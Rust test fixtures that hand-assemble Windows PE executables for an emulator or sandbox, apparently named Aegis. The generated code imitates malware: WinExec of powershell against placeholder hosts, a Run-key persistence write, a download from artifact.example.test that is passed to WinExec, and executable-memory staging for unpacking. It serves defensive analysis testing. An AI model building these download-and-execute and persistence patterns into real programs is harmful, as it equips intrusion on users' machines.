//! Deterministic, harmless PE32 fixture used by tests and the browser demo.

pub fn safe_dynamic_pe32() -> Vec<u8> {
    let mut bytes = vec![0u8; 0x600];
    bytes[0..2].copy_from_slice(b"MZ");
    put_u32(&mut bytes, 0x3c, 0x80);
    bytes[0x80..0x84].copy_from_slice(b"PE\0\0");

    // COFF header.
    put_u16(&mut bytes, 0x84, 0x014c);
    put_u16(&mut bytes, 0x86, 2);
    put_u32(&mut bytes, 0x88, 0x66aa_5500);
    put_u16(&mut bytes, 0x94, 0x00e0);
    put_u16(&mut bytes, 0x96, 0x0102);

    // PE32 optional header.
    let optional = 0x98;
    put_u16(&mut bytes, optional, 0x010b);
    bytes[optional + 2] = 14;
    put_u32(&mut bytes, optional + 4, 0x200);
    put_u32(&mut bytes, optional + 8, 0x200);
    put_u32(&mut bytes, optional + 16, 0x1000);
    put_u32(&mut bytes, optional + 20, 0x1000);
    put_u32(&mut bytes, optional + 24, 0x2000);
    put_u32(&mut bytes, optional + 28, 0x0040_0000);
    put_u32(&mut bytes, optional + 32, 0x1000);
    put_u32(&mut bytes, optional + 36, 0x200);
    put_u16(&mut bytes, optional + 40, 6);
    put_u16(&mut bytes, optional + 48, 6);
    put_u32(&mut bytes, optional + 56, 0x3000);
    put_u32(&mut bytes, optional + 60, 0x200);
    put_u16(&mut bytes, optional + 68, 3);
    put_u16(&mut bytes, optional + 70, 0x0140);
    put_u32(&mut bytes, optional + 72, 0x10_0000);
    put_u32(&mut bytes, optional + 76, 0x1000);
    put_u32(&mut bytes, optional + 80, 0x10_0000);
    put_u32(&mut bytes, optional + 84, 0x1000);
    put_u32(&mut bytes, optional + 92, 16);
    // Import and IAT directories.
    put_u32(&mut bytes, optional + 104, 0x2000);
    put_u32(&mut bytes, optional + 108, 0x28);
    put_u32(&mut bytes, optional + 192, 0x2060);
    put_u32(&mut bytes, optional + 196, 0x14);

    let text_section = optional + 0xe0;
    write_section(
        &mut bytes,
        text_section,
        b".text",
        (0x200, 0x1000, 0x200, 0x200, 0x6000_0020),
    );
    write_section(
        &mut bytes,
        text_section + 40,
        b".idata",
        (0x200, 0x2000, 0x200, 0x400, 0xc000_0040),
    );

    // Entry point: call deterministic APIs, request a process execution, exit.
    let code = [
        0xff, 0x15, 0x60, 0x20, 0x40, 0x00, // call [GetTickCount]
        0x6a, 0x19, // push 25
        0xff, 0x15, 0x64, 0x20, 0x40, 0x00, // call [Sleep]
        0x6a, 0x01, // push SW_SHOWNORMAL
        0x68, 0x00, 0x11, 0x40, 0x00, // push command string
        0xff, 0x15, 0x68, 0x20, 0x40, 0x00, // call [WinExec]
        0x6a, 0x00, // push 0
        0xff, 0x15, 0x6c, 0x20, 0x40, 0x00, // call [ExitProcess]
        0xcc, // int3 fallback
    ];
    bytes[0x200..0x200 + code.len()].copy_from_slice(&code);
    let command = b"powershell.exe -NoProfile https://example.test 10.20.30.40\0";
    bytes[0x300..0x300 + command.len()].copy_from_slice(command);

    // Import descriptor, lookup table, IAT, DLL name, and hint/name records.
    put_u32(&mut bytes, 0x400, 0x2040);
    put_u32(&mut bytes, 0x40c, 0x2080);
    put_u32(&mut bytes, 0x410, 0x2060);
    for (index, name_rva) in [0x2090, 0x20a0, 0x20a8, 0x20b4, 0].into_iter().enumerate() {
        put_u32(&mut bytes, 0x440 + index * 4, name_rva);
        put_u32(&mut bytes, 0x460 + index * 4, name_rva);
    }
    write_c_string(&mut bytes, 0x480, b"KERNEL32.dll");
    write_hint_name(&mut bytes, 0x490, b"GetTickCount");
    write_hint_name(&mut bytes, 0x4a0, b"Sleep");
    write_hint_name(&mut bytes, 0x4a8, b"WinExec");
    write_hint_name(&mut bytes, 0x4b4, b"ExitProcess");
    bytes
}

pub fn safe_dynamic_pe64() -> Vec<u8> {
    let mut bytes = vec![0u8; 0x800];
    bytes[0..2].copy_from_slice(b"MZ");
    put_u32(&mut bytes, 0x3c, 0x80);
    bytes[0x80..0x84].copy_from_slice(b"PE\0\0");

    put_u16(&mut bytes, 0x84, 0x8664);
    put_u16(&mut bytes, 0x86, 2);
    put_u32(&mut bytes, 0x88, 0x66aa_6400);
    put_u16(&mut bytes, 0x94, 0x00f0);
    put_u16(&mut bytes, 0x96, 0x0022);

    let optional = 0x98;
    put_u16(&mut bytes, optional, 0x020b);
    bytes[optional + 2] = 14;
    put_u32(&mut bytes, optional + 4, 0x200);
    put_u32(&mut bytes, optional + 8, 0x400);
    put_u32(&mut bytes, optional + 16, 0x1000);
    put_u32(&mut bytes, optional + 20, 0x1000);
    put_u64(&mut bytes, optional + 24, 0x0000_0001_4000_0000);
    put_u32(&mut bytes, optional + 32, 0x1000);
    put_u32(&mut bytes, optional + 36, 0x200);
    put_u16(&mut bytes, optional + 40, 6);
    put_u16(&mut bytes, optional + 48, 6);
    put_u32(&mut bytes, optional + 56, 0x3000);
    put_u32(&mut bytes, optional + 60, 0x200);
    put_u16(&mut bytes, optional + 68, 3);
    put_u16(&mut bytes, optional + 70, 0x0160);
    put_u64(&mut bytes, optional + 72, 0x10_0000);
    put_u64(&mut bytes, optional + 80, 0x1000);
    put_u64(&mut bytes, optional + 88, 0x10_0000);
    put_u64(&mut bytes, optional + 96, 0x1000);
    put_u32(&mut bytes, optional + 108, 16);
    // Import, exception/unwind, TLS, and IAT directories.
    put_u32(&mut bytes, optional + 120, 0x2000);
    put_u32(&mut bytes, optional + 124, 0x28);
    put_u32(&mut bytes, optional + 136, 0x2180);
    put_u32(&mut bytes, optional + 140, 12);
    put_u32(&mut bytes, optional + 184, 0x21c0);
    put_u32(&mut bytes, optional + 188, 40);
    put_u32(&mut bytes, optional + 208, 0x2080);
    put_u32(&mut bytes, optional + 212, 0x28);

    let section = optional + 0xf0;
    write_section(
        &mut bytes,
        section,
        b".text",
        (0x200, 0x1000, 0x200, 0x200, 0x6000_0020),
    );
    write_section(
        &mut bytes,
        section + 40,
        b".idata",
        (0x400, 0x2000, 0x400, 0x400, 0xc000_0040),
    );

    let code = [
        0x48, 0x83, 0xec, 0x28, // sub rsp, 40-byte shadow/alignment area
        0xff, 0x15, 0x76, 0x10, 0x00, 0x00, // call [rip+0x1076] GetTickCount
        0xb9, 0x19, 0x00, 0x00, 0x00, // mov ecx, 25
        0xff, 0x15, 0x73, 0x10, 0x00, 0x00, // call [rip+0x1073] Sleep
        0x48, 0x8d, 0x0d, 0xe4, 0x00, 0x00, 0x00, // lea rcx,[rip+0xe4]
        0xba, 0x01, 0x00, 0x00, 0x00, // mov edx, 1
        0xff, 0x15, 0x69, 0x10, 0x00, 0x00, // call [rip+0x1069] WinExec
        0x31, 0xc9, // xor ecx,ecx
        0xff, 0x15, 0x69, 0x10, 0x00, 0x00, // call [rip+0x1069] ExitProcess
        0x48, 0x83, 0xc4, 0x28, 0xc3,
    ];
    bytes[0x200..0x200 + code.len()].copy_from_slice(&code);
    write_c_string(
        &mut bytes,
        0x300,
        b"powershell.exe -NoProfile https://x64.example.test",
    );
    bytes[0x350] = 0xc3; // TLS callback: ret

    put_u32(&mut bytes, 0x400, 0x2040);
    put_u32(&mut bytes, 0x40c, 0x20c0);
    put_u32(&mut bytes, 0x410, 0x2080);
    for (index, name_rva) in [0x2100u64, 0x2110, 0x2120, 0x2130, 0]
        .into_iter()
        .enumerate()
    {
        put_u64(&mut bytes, 0x440 + index * 8, name_rva);
        put_u64(&mut bytes, 0x480 + index * 8, name_rva);
    }
    write_c_string(&mut bytes, 0x4c0, b"KERNEL32.dll");
    write_hint_name(&mut bytes, 0x500, b"GetTickCount");
    write_hint_name(&mut bytes, 0x510, b"Sleep");
    write_hint_name(&mut bytes, 0x520, b"WinExec");
    write_hint_name(&mut bytes, 0x530, b"ExitProcess");

    put_u32(&mut bytes, 0x580, 0x1000);
    put_u32(&mut bytes, 0x584, 0x1034);
    put_u32(&mut bytes, 0x588, 0x2190);
    bytes[0x590..0x598].copy_from_slice(&[0x01, 0x04, 0x01, 0x00, 0x04, 0x42, 0, 0]);

    put_u64(&mut bytes, 0x5c0 + 24, 0x0000_0001_4000_21f0);
    put_u64(&mut bytes, 0x5f0, 0x0000_0001_4000_1150);
    put_u64(&mut bytes, 0x5f8, 0);
    bytes
}

/// Harmless PE64 fixture for static function, disassembly, CFG, and capability
/// analysis. Both branch paths converge on synthetic WinExec/ExitProcess calls;
/// no host instruction or network operation is ever performed.
pub fn code_analysis_pe64() -> Vec<u8> {
    let mut bytes = safe_dynamic_pe64();
    bytes[0x200..0x400].fill(0);
    let code = [
        0x31, 0xc0, // xor eax,eax
        0x85, 0xc0, // test eax,eax
        0x74, 0x07, // je branch_b (RVA 0x100d)
        0xe8, 0x75, 0x00, 0x00, 0x00, // call helper_a (RVA 0x1080)
        0xeb, 0x09, // jmp converge (RVA 0x1016)
        0xe8, 0x7e, 0x00, 0x00, 0x00, // branch_b: call helper_b (RVA 0x1090)
        0xeb, 0x02, // jmp converge
        0x90, 0x90, // unreachable padding
        0x48, 0x83, 0xec, 0x28, // converge: shadow space
        0x48, 0x8d, 0x0d, 0xdf, 0x00, 0x00, 0x00, // lea rcx,[command]
        0xba, 0x01, 0x00, 0x00, 0x00, // mov edx,SW_SHOWNORMAL
        0xff, 0x15, 0x64, 0x10, 0x00, 0x00, // call [WinExec]
        0x31, 0xc9, // xor ecx,ecx
        0xff, 0x15, 0x64, 0x10, 0x00, 0x00, // call [ExitProcess]
        0x48, 0x83, 0xc4, 0x28, // add rsp,28h (unreached fallback)
        0xc3,
    ];
    bytes[0x200..0x200 + code.len()].copy_from_slice(&code);
    bytes[0x280..0x286].copy_from_slice(&[0xb8, 0x01, 0x00, 0x00, 0x00, 0xc3]);
    bytes[0x290..0x293].copy_from_slice(&[0x31, 0xc0, 0xc3]);
    write_c_string(
        &mut bytes,
        0x300,
        b"powershell.exe -NoProfile https://cfg.example.test",
    );
    bytes[0x350] = 0xc3; // Preserve the harmless TLS callback.
    bytes
}

/// Harmless PE64 fixture that exercises the bounded x64 parity surfaces:
/// artifacts, virtual Windows state, scripted network, provenance, threads,
/// and vectored exception handling. It contains no native host interaction.
pub fn parity_dynamic_pe64() -> Vec<u8> {
    const IMAGE_BASE: u64 = 0x0000_0001_4000_0000;
    const CODE_RVA: u32 = 0x1000;
    const HANDLER_RVA: u32 = 0x15c0;
    const THREAD_RVA: u32 = 0x15d0;
    const PATH_RVA: u32 = 0x1480;
    const PAYLOAD_RVA: u32 = 0x14c0;
    const SUBKEY_RVA: u32 = 0x1500;
    const VALUE_RVA: u32 = 0x1540;
    const URL_RVA: u32 = 0x1560;
    const SCRATCH_RVA: u32 = 0x1700;
    const LOOKUP_RVA: u32 = 0x2040;
    const IAT_RVA: u32 = 0x20e0;

    fn mov_imm64(code: &mut Vec<u8>, register: u8, value: u64) {
        match register {
            1 => code.extend_from_slice(&[0x48, 0xb9]), // rcx
            2 => code.extend_from_slice(&[0x48, 0xba]), // rdx
            8 => code.extend_from_slice(&[0x49, 0xb8]), // r8
            9 => code.extend_from_slice(&[0x49, 0xb9]), // r9
            _ => unreachable!(),
        }
        code.extend_from_slice(&value.to_le_bytes());
    }

    fn stack_imm32(code: &mut Vec<u8>, offset: u8, value: u32) {
        code.extend_from_slice(&[0x48, 0xc7, 0x44, 0x24, offset]);
        code.extend_from_slice(&value.to_le_bytes());
    }

    fn call_iat(code: &mut Vec<u8>, iat_rva: u32, index: usize) {
        let instruction_rva = CODE_RVA + code.len() as u32;
        let next_rva = instruction_rva + 6;
        let target = iat_rva + (index * 8) as u32;
        let displacement = target as i64 - next_rva as i64;
        code.extend_from_slice(&[0xff, 0x15]);
        code.extend_from_slice(&(displacement as i32).to_le_bytes());
    }

    fn load_rcx_rip(code: &mut Vec<u8>, target_rva: u32) {
        let instruction_rva = CODE_RVA + code.len() as u32;
        let next_rva = instruction_rva + 7;
        let displacement = target_rva as i64 - next_rva as i64;
        code.extend_from_slice(&[0x48, 0x8b, 0x0d]);
        code.extend_from_slice(&(displacement as i32).to_le_bytes());
    }

    let imports: [&[u8]; 16] = [
        b"AddVectoredExceptionHandler",
        b"RaiseException",
        b"VirtualAlloc",
        b"VirtualProtect",
        b"CreateFileA",
        b"WriteFile",
        b"ReadFile",
        b"RegOpenKeyExA",
        b"RegSetValueExA",
        b"RegQueryValueExA",
        b"InternetOpenA",
        b"InternetOpenUrlA",
        b"InternetReadFile",
        b"WinExec",
        b"CreateThread",
        b"ExitProcess",
    ];

    let mut bytes = vec![0u8; 0xc00];
    bytes[0..2].copy_from_slice(b"MZ");
    put_u32(&mut bytes, 0x3c, 0x80);
    bytes[0x80..0x84].copy_from_slice(b"PE\0\0");
    put_u16(&mut bytes, 0x84, 0x8664);
    put_u16(&mut bytes, 0x86, 2);
    put_u32(&mut bytes, 0x88, 0x66aa_6411);
    put_u16(&mut bytes, 0x94, 0x00f0);
    put_u16(&mut bytes, 0x96, 0x0022);

    let optional = 0x98;
    put_u16(&mut bytes, optional, 0x020b);
    bytes[optional + 2] = 14;
    put_u32(&mut bytes, optional + 4, 0x600);
    put_u32(&mut bytes, optional + 8, 0x400);
    put_u32(&mut bytes, optional + 16, CODE_RVA);
    put_u32(&mut bytes, optional + 20, CODE_RVA);
    put_u64(&mut bytes, optional + 24, IMAGE_BASE);
    put_u32(&mut bytes, optional + 32, 0x1000);
    put_u32(&mut bytes, optional + 36, 0x200);
    put_u16(&mut bytes, optional + 40, 6);
    put_u16(&mut bytes, optional + 48, 6);
    put_u32(&mut bytes, optional + 56, 0x3000);
    put_u32(&mut bytes, optional + 60, 0x200);
    put_u16(&mut bytes, optional + 68, 3);
    put_u16(&mut bytes, optional + 70, 0x0160);
    put_u64(&mut bytes, optional + 72, 0x10_0000);
    put_u64(&mut bytes, optional + 80, 0x1000);
    put_u64(&mut bytes, optional + 88, 0x10_0000);
    put_u64(&mut bytes, optional + 96, 0x1000);
    put_u32(&mut bytes, optional + 108, 16);
    put_u32(&mut bytes, optional + 120, 0x2000);
    put_u32(&mut bytes, optional + 124, 0x28);
    put_u32(&mut bytes, optional + 136, 0x15e0);
    put_u32(&mut bytes, optional + 140, 12);
    put_u32(&mut bytes, optional + 208, IAT_RVA);
    put_u32(&mut bytes, optional + 212, ((imports.len() + 1) * 8) as u32);

    let section = optional + 0xf0;
    write_section(
        &mut bytes,
        section,
        b".text",
        (0x800, 0x1000, 0x600, 0x200, 0xe000_0020),
    );
    write_section(
        &mut bytes,
        section + 40,
        b".idata",
        (0x400, 0x2000, 0x400, 0x800, 0xc000_0040),
    );

    let mut code = Vec::new();
    code.extend_from_slice(&[0x48, 0x83, 0xec, 0x78]);

    mov_imm64(&mut code, 1, 1);
    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(HANDLER_RVA));
    call_iat(&mut code, IAT_RVA, 0);
    mov_imm64(&mut code, 1, 0xe042_4242);
    mov_imm64(&mut code, 2, 0);
    mov_imm64(&mut code, 8, 0);
    mov_imm64(&mut code, 9, 0);
    call_iat(&mut code, IAT_RVA, 1);

    mov_imm64(&mut code, 1, 0);
    mov_imm64(&mut code, 2, 0x1000);
    mov_imm64(&mut code, 8, 0x3000);
    mov_imm64(&mut code, 9, 0x04);
    call_iat(&mut code, IAT_RVA, 2);
    code.extend_from_slice(&[0x49, 0x89, 0xc4]); // mov r12,rax
    code.extend_from_slice(&[0x41, 0xc7, 0x04, 0x24, 0x4d, 0x5a, 0x20, 0x41]);
    code.extend_from_slice(&[0x4c, 0x89, 0xe1]); // mov rcx,r12
    mov_imm64(&mut code, 2, 0x1000);
    mov_imm64(&mut code, 8, 0x40);
    mov_imm64(&mut code, 9, IMAGE_BASE + u64::from(SCRATCH_RVA));
    call_iat(&mut code, IAT_RVA, 3);

    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(PATH_RVA));
    mov_imm64(&mut code, 2, 0x4000_0000);
    mov_imm64(&mut code, 8, 0);
    mov_imm64(&mut code, 9, 0);
    stack_imm32(&mut code, 0x20, 2);
    stack_imm32(&mut code, 0x28, 0);
    stack_imm32(&mut code, 0x30, 0);
    call_iat(&mut code, IAT_RVA, 4);
    code.extend_from_slice(&[0x48, 0x89, 0xc3]); // mov rbx,rax
    code.extend_from_slice(&[0x48, 0x89, 0xd9]); // mov rcx,rbx
    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(PAYLOAD_RVA));
    mov_imm64(&mut code, 8, 48);
    mov_imm64(&mut code, 9, IMAGE_BASE + u64::from(SCRATCH_RVA));
    stack_imm32(&mut code, 0x20, 0);
    call_iat(&mut code, IAT_RVA, 5);

    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(PATH_RVA));
    mov_imm64(&mut code, 2, 0x8000_0000);
    mov_imm64(&mut code, 8, 0);
    mov_imm64(&mut code, 9, 0);
    stack_imm32(&mut code, 0x20, 3);
    stack_imm32(&mut code, 0x28, 0);
    stack_imm32(&mut code, 0x30, 0);
    call_iat(&mut code, IAT_RVA, 4);
    code.extend_from_slice(&[0x48, 0x89, 0xc3]); // mov rbx,rax
    code.extend_from_slice(&[0x48, 0x89, 0xd9]); // mov rcx,rbx
    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(SCRATCH_RVA + 0x200));
    mov_imm64(&mut code, 8, 48);
    mov_imm64(&mut code, 9, IMAGE_BASE + u64::from(SCRATCH_RVA));
    stack_imm32(&mut code, 0x20, 0);
    call_iat(&mut code, IAT_RVA, 6);

    mov_imm64(&mut code, 1, 0x8000_0001);
    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(SUBKEY_RVA));
    mov_imm64(&mut code, 8, 0);
    mov_imm64(&mut code, 9, 0x20006);
    stack_imm32(&mut code, 0x20, SCRATCH_RVA + 8);
    // Replace the low RVA with the full fixed image pointer.
    let output_patch = code.len() - 4;
    code[output_patch..output_patch + 4]
        .copy_from_slice(&((IMAGE_BASE + u64::from(SCRATCH_RVA + 8)) as u32).to_le_bytes());
    // The emitter is imm32, so write a full pointer in rax then spill it to the stack slot.
    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(SCRATCH_RVA + 8));
    code.extend_from_slice(&[0x48, 0x89, 0x4c, 0x24, 0x20]);
    mov_imm64(&mut code, 1, 0x8000_0001);
    call_iat(&mut code, IAT_RVA, 7);
    load_rcx_rip(&mut code, SCRATCH_RVA + 8);
    code.extend_from_slice(&[0x49, 0x89, 0xcf]); // mov r15,rcx
    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(VALUE_RVA));
    mov_imm64(&mut code, 8, 0);
    mov_imm64(&mut code, 9, 1);
    stack_imm32(&mut code, 0x20, PAYLOAD_RVA);
    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(PAYLOAD_RVA));
    code.extend_from_slice(&[0x48, 0x89, 0x4c, 0x24, 0x20]);
    load_rcx_rip(&mut code, SCRATCH_RVA + 8);
    stack_imm32(&mut code, 0x28, 48);
    call_iat(&mut code, IAT_RVA, 8);

    code.extend_from_slice(&[0x4c, 0x89, 0xf9]); // mov rcx,r15
    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(VALUE_RVA));
    mov_imm64(&mut code, 8, 0);
    mov_imm64(&mut code, 9, 0);
    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(SCRATCH_RVA + 0x280));
    code.extend_from_slice(&[0x48, 0x89, 0x4c, 0x24, 0x20]);
    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(SCRATCH_RVA + 0x2f0));
    code.extend_from_slice(&[0x48, 0x89, 0x4c, 0x24, 0x28]);
    code.extend_from_slice(&[0x4c, 0x89, 0xf9]); // mov rcx,r15
    call_iat(&mut code, IAT_RVA, 9);

    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(VALUE_RVA));
    mov_imm64(&mut code, 2, 0);
    mov_imm64(&mut code, 8, 0);
    mov_imm64(&mut code, 9, 0);
    stack_imm32(&mut code, 0x20, 0);
    call_iat(&mut code, IAT_RVA, 10);
    code.extend_from_slice(&[0x49, 0x89, 0xc5]); // mov r13,rax
    code.extend_from_slice(&[0x4c, 0x89, 0xe9]); // mov rcx,r13
    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(URL_RVA));
    mov_imm64(&mut code, 8, 0);
    mov_imm64(&mut code, 9, 0);
    stack_imm32(&mut code, 0x20, 0);
    stack_imm32(&mut code, 0x28, 0);
    call_iat(&mut code, IAT_RVA, 11);
    code.extend_from_slice(&[0x49, 0x89, 0xc6]); // mov r14,rax
    code.extend_from_slice(&[0x4c, 0x89, 0xf1]); // mov rcx,r14
    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(SCRATCH_RVA + 0x100));
    mov_imm64(&mut code, 8, 64);
    mov_imm64(&mut code, 9, IMAGE_BASE + u64::from(SCRATCH_RVA + 0x180));
    call_iat(&mut code, IAT_RVA, 12);
    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(SCRATCH_RVA + 0x100));
    mov_imm64(&mut code, 2, 1);
    call_iat(&mut code, IAT_RVA, 13);

    mov_imm64(&mut code, 1, 0);
    mov_imm64(&mut code, 2, 0);
    mov_imm64(&mut code, 8, IMAGE_BASE + u64::from(THREAD_RVA));
    mov_imm64(&mut code, 9, 0x1337);
    stack_imm32(&mut code, 0x20, 0);
    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(SCRATCH_RVA + 0x1c0));
    code.extend_from_slice(&[0x48, 0x89, 0x4c, 0x24, 0x28]);
    mov_imm64(&mut code, 1, 0);
    call_iat(&mut code, IAT_RVA, 14);
    code.extend(std::iter::repeat_n(0x90, 120));
    mov_imm64(&mut code, 1, 0);
    call_iat(&mut code, IAT_RVA, 15);
    code.extend_from_slice(&[0xf4]);
    assert!(code.len() < (HANDLER_RVA - CODE_RVA) as usize);
    bytes[0x200..0x200 + code.len()].copy_from_slice(&code);

    bytes[0x7c0..0x7c6].copy_from_slice(&[0xb8, 0xff, 0xff, 0xff, 0xff, 0xc3]);
    bytes[0x7d0..0x7d8].copy_from_slice(&[0x48, 0x89, 0xc8, 0x48, 0x83, 0xc0, 0x01, 0xc3]);
    put_u32(&mut bytes, 0x7e0, CODE_RVA);
    put_u32(&mut bytes, 0x7e4, HANDLER_RVA);
    put_u32(&mut bytes, 0x7e8, 0x15f0);
    bytes[0x7f0..0x7f8].copy_from_slice(&[0x01, 0x04, 0x01, 0x00, 0x04, 0x42, 0, 0]);
    write_c_string(&mut bytes, 0x680, b"C:\\Temp\\aegis-x64-parity.bin");
    let payload = b"MZ AEGIS_X64_PARITY powershell https://artifact.example.test";
    bytes[0x6c0..0x6c0 + payload.len()].copy_from_slice(payload);
    write_c_string(
        &mut bytes,
        0x700,
        b"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    );
    write_c_string(&mut bytes, 0x740, b"AegisSafeParity");
    write_c_string(&mut bytes, 0x760, b"http://artifact.example.test/start");

    put_u32(&mut bytes, 0x800, LOOKUP_RVA);
    let mut name_raw = 0x980usize;
    let mut name_rvas = Vec::new();
    for name in imports {
        let rva = 0x2000 + (name_raw - 0x800) as u32;
        name_rvas.push(rva);
        write_hint_name(&mut bytes, name_raw, name);
        name_raw = (name_raw + name.len() + 3) & !1;
    }
    let dll_rva = 0x2000 + (name_raw - 0x800) as u32;
    write_c_string(&mut bytes, name_raw, b"KERNEL32.dll");
    put_u32(&mut bytes, 0x80c, dll_rva);
    put_u32(&mut bytes, 0x810, IAT_RVA);
    for (index, name_rva) in name_rvas.into_iter().enumerate() {
        put_u64(&mut bytes, 0x840 + index * 8, u64::from(name_rva));
        put_u64(&mut bytes, 0x8e0 + index * 8, u64::from(name_rva));
    }
    bytes
}

/// Harmless PE64 fixture for dynamic export resolution and automated unpacking
/// evidence. It copies an inert MZ-marked stage into synthetic heap memory,
/// marks it executable, resolves GetTickCount, and calls that emulator-owned
/// stub from the generated stage before exiting.
pub fn unpacking_dynamic_pe64() -> Vec<u8> {
    const IMAGE_BASE: u64 = 0x0000_0001_4000_0000;
    const CODE_RVA: u32 = 0x1000;
    const MODULE_RVA: u32 = 0x1500;
    const SYMBOL_RVA: u32 = 0x1520;
    const STAGE_RVA: u32 = 0x1540;
    const DELAY_RVA: u32 = 0x1580;
    const BASE_RVA: u32 = 0x1588;
    const SIZE_RVA: u32 = 0x1590;
    const OLD_PROTECT_RVA: u32 = 0x1598;
    const UNICODE_DESCRIPTOR_RVA: u32 = 0x15a0;
    const UNICODE_BUFFER_RVA: u32 = 0x15b0;
    const ANSI_DESCRIPTOR_RVA: u32 = 0x15e0;
    const ANSI_BUFFER_RVA: u32 = 0x15c8;
    const MODULE_OUTPUT_RVA: u32 = 0x15f0;
    const API_OUTPUT_RVA: u32 = 0x15f8;
    const QUERY_OUTPUT_RVA: u32 = 0x1700;
    const QUERY_LENGTH_RVA: u32 = 0x1720;
    const LOOKUP_RVA: u32 = 0x2040;
    const IAT_RVA: u32 = 0x20e0;

    fn mov_imm64(code: &mut Vec<u8>, register: u8, value: u64) {
        match register {
            1 => code.extend_from_slice(&[0x48, 0xb9]),
            2 => code.extend_from_slice(&[0x48, 0xba]),
            8 => code.extend_from_slice(&[0x49, 0xb8]),
            9 => code.extend_from_slice(&[0x49, 0xb9]),
            _ => unreachable!(),
        }
        code.extend_from_slice(&value.to_le_bytes());
    }

    fn call_iat(code: &mut Vec<u8>, index: usize) {
        let next_rva = CODE_RVA + code.len() as u32 + 6;
        let target = IAT_RVA + (index * 8) as u32;
        code.extend_from_slice(&[0xff, 0x15]);
        code.extend_from_slice(&((target as i64 - next_rva as i64) as i32).to_le_bytes());
    }

    fn stack_imm32(code: &mut Vec<u8>, offset: u8, value: u32) {
        code.extend_from_slice(&[0x48, 0xc7, 0x44, 0x24, offset]);
        code.extend_from_slice(&value.to_le_bytes());
    }

    fn load_r12_rip(code: &mut Vec<u8>, target_rva: u32) {
        let next_rva = CODE_RVA + code.len() as u32 + 7;
        code.extend_from_slice(&[0x4c, 0x8b, 0x25]);
        code.extend_from_slice(&((target_rva as i64 - next_rva as i64) as i32).to_le_bytes());
    }

    fn load_rcx_rip(code: &mut Vec<u8>, target_rva: u32) {
        let next_rva = CODE_RVA + code.len() as u32 + 7;
        code.extend_from_slice(&[0x48, 0x8b, 0x0d]);
        code.extend_from_slice(&((target_rva as i64 - next_rva as i64) as i32).to_le_bytes());
    }

    fn load_rax_rip(code: &mut Vec<u8>, target_rva: u32) {
        let next_rva = CODE_RVA + code.len() as u32 + 7;
        code.extend_from_slice(&[0x48, 0x8b, 0x05]);
        code.extend_from_slice(&((target_rva as i64 - next_rva as i64) as i32).to_le_bytes());
    }

    let imports: [&[u8]; 10] = [
        b"NtAllocateVirtualMemory",
        b"RtlMoveMemory",
        b"NtProtectVirtualMemory",
        b"LoadLibraryA",
        b"GetProcAddress",
        b"LdrLoadDll",
        b"LdrGetProcedureAddress",
        b"NtDelayExecution",
        b"NtQueryInformationProcess",
        b"ExitProcess",
    ];
    let mut bytes = parity_dynamic_pe64();
    bytes[0x200..0x800].fill(0);
    bytes[0x800..0xc00].fill(0);
    put_u32(&mut bytes, 0x88, 0x66aa_6412);
    let optional = 0x98;
    put_u32(&mut bytes, optional + 120, 0x2000);
    put_u32(&mut bytes, optional + 124, 0x28);
    put_u32(&mut bytes, optional + 136, 0);
    put_u32(&mut bytes, optional + 140, 0);
    put_u32(&mut bytes, optional + 208, IAT_RVA);
    put_u32(&mut bytes, optional + 212, ((imports.len() + 1) * 8) as u32);

    let mut code = Vec::new();
    code.extend_from_slice(&[0x48, 0x83, 0xec, 0x78]);
    mov_imm64(&mut code, 1, u64::MAX);
    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(BASE_RVA));
    mov_imm64(&mut code, 8, 0);
    mov_imm64(&mut code, 9, IMAGE_BASE + u64::from(SIZE_RVA));
    stack_imm32(&mut code, 0x20, 0x3000);
    stack_imm32(&mut code, 0x28, 0x04);
    call_iat(&mut code, 0);
    load_r12_rip(&mut code, BASE_RVA);

    code.extend_from_slice(&[0x4c, 0x89, 0xe1]); // mov rcx,r12
    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(STAGE_RVA));
    mov_imm64(&mut code, 8, 64);
    call_iat(&mut code, 1);

    mov_imm64(&mut code, 1, u64::MAX);
    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(BASE_RVA));
    mov_imm64(&mut code, 8, IMAGE_BASE + u64::from(SIZE_RVA));
    mov_imm64(&mut code, 9, 0x40);
    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(OLD_PROTECT_RVA));
    code.extend_from_slice(&[0x48, 0x89, 0x4c, 0x24, 0x20]);
    mov_imm64(&mut code, 1, u64::MAX);
    call_iat(&mut code, 2);

    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(MODULE_RVA));
    call_iat(&mut code, 3);
    code.extend_from_slice(&[0x49, 0x89, 0xc5]); // mov r13,rax
    code.extend_from_slice(&[0x4c, 0x89, 0xe9]); // mov rcx,r13
    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(SYMBOL_RVA));
    call_iat(&mut code, 4);
    // Resolve the same export twice: Windows returns a stable address, and the
    // emulator must reuse its existing stub rather than consuming another slot.
    code.extend_from_slice(&[0x4c, 0x89, 0xe9]); // mov rcx,r13
    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(SYMBOL_RVA));
    call_iat(&mut code, 4);
    code.extend_from_slice(&[0x49, 0x89, 0xc6]); // mov r14,rax

    mov_imm64(&mut code, 1, 0);
    mov_imm64(&mut code, 2, 0);
    mov_imm64(&mut code, 8, IMAGE_BASE + u64::from(UNICODE_DESCRIPTOR_RVA));
    mov_imm64(&mut code, 9, IMAGE_BASE + u64::from(MODULE_OUTPUT_RVA));
    call_iat(&mut code, 5);
    load_rcx_rip(&mut code, MODULE_OUTPUT_RVA);
